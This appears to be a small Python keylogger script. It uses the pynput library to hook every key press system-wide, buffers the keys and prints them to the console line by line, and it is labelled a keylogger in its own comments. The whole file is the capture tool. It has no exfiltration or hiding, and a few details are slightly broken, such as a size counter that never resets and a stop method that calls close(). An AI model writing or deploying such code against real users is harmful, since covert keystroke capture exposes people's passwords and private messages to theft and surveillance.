from pynput import keyboard
import pynput
# https://github.com/moses-palmer/pynput/issues/20


class logger:

    def __init__(self):

        # WORK AS STACK -> BACKSPACE = POP
        self.__buffer = []
        self.__buffer_size = 0
        self.__listener = None


    def run(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as self.__listener:
            self.__listener.join()


    def write_to_buffer(self, key):
        if(self.__buffer_size == 1024 or key == pynput.keyboard.Key.enter):
            self.__buffer.append("\n")
            print(''.join(self.__buffer))
            self.__buffer = []
        else:
            if(key == pynput.keyboard.Key.space):
                self.__buffer.append(" ")
            else:
                self.__buffer.append(str(key).replace("'", ""))
        
        # Stop keylogger
        # if(CONDITION):
        #     self.stop()

        self.__buffer_size += 1

    def on_press(self, key):
        self.write_to_buffer(key)

    def on_release(self, key):
        pass
    
    def stop(self):
        self.__listener.close()


if __name__ == "__main__":
    
    l = logger()
    l.run()